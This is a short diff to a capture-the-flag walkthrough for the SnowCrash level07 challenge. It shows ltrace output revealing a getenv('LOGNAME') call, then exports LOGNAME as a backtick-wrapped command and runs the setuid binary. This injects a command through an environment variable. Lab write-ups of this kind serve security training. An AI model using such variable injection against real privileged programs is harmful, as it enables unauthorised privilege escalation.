@@ -6,6 +6,8 @@ level07@SnowCrash:~$ ltrace ./level07
 """""
 setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)
 getenv("LOGNAME")
+....
 """""
 getenv — Получение значения переменной окружения.
 level07@SnowCrash:~$ export LOGNAME='`getflag`'
+level07@SnowCrash:~$ ./level07
